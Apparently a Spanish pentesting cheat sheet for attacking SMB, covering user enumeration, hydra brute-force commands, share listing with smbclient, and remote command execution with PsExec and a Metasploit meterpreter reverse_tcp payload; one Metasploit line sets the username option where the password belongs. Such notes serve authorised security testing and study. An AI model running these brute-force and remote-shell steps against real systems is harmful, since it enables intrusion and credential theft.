# SMB

### Identificación de usuarios

Es recomendable enumerar los usuarios antes de realizar un ataque de fuerza bruta para obtener contraseñas. Esto se debe a que al reducir la lista de usuarios, reducimos el tiempo del ataque y la probabilidad de detección.

**Con `smb_enumusers` de `metasploit`:**

```bash
msf > use auxiliary/scanner/smb/smb_enumusers
msf auxiliary(scanner/smb/smb_enumusers) > set rhosts <IP>
msf auxiliary(scanner/smb/smb_enumusers) > run
```

**Con `enum4linux`:**

```bash
enum4linux -U <IP>
```

También podemos volver a enumerar los usuarios con esta herramienta una vez obtenidas las credenciales para tener un mayor alcance:

```bash
enum4linux -u usuario -p contraseña -U <IP>
```

**Con `smb-enum-users` de `nmap`:**

La mayoría de Windows modernos y muchas configuraciones de Samba bloquean la enumeración anónima de usuarios, pero puede funcionar en ciertos casos:

```bash
nmap -p445 --script smb-enum-users <IP>
```

### Obtención de credenciales

```bash
hydra -l <USR> -P <PASS_WORDLIST> <IP> <SERVICE>
hydra -L <USR_WORDLIST> -P <PASS_WORDLIST> <IP> <SERVICE>
```

### Enumeración de recursos compartidos

**Con `smbclient`**

Si ya tenemos las credenciales podemos listar los recursos a los que tiene acceso el usuario:

```bash
smbclient -L 192.168.1.135 -U usuario
```

En caso contrario, podemos comprobar si un recurso tiene acceso mediante usuario anónimo. Si se obtiene acceso o un error que indique que el acceso ha sido denegado, signifca que el recurso existe aunque no sea accesible.

```bash
smbclient //HOST/share -N -c "ls"
```

Para automatizar esta tarea podemos usar el scritp `smbfuzz` disponible [aquí](https://github.com/mjmariscalr/scripts/tree/main/smbfuzz)

### Ejecución remota de comandos con `PsExec`

sExec es una herramienta que permite ejecutar procesos de forma remota en sistemas Windows a través de SMB. Funciona autenticándose en la máquina objetivo con credenciales válidas, copiando y ejecutando un servicio temporal que lanza el proceso solicitado (por ejemplo, cmd.exe) y redirige su entrada y salida al equipo atacante.

```bash
python psexec.py usuario@host
Password:
C:\Windows\system32>
```

También se encuentra disponible en metasploit:

```bash
msf > use exploit/windows/smb/psexec
msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/psexec) > set smbuser usuario
msf exploit(windows/smb/psexec) > set smbuser contraseña
msf exploit(windows/smb/psexec) > exploit
```
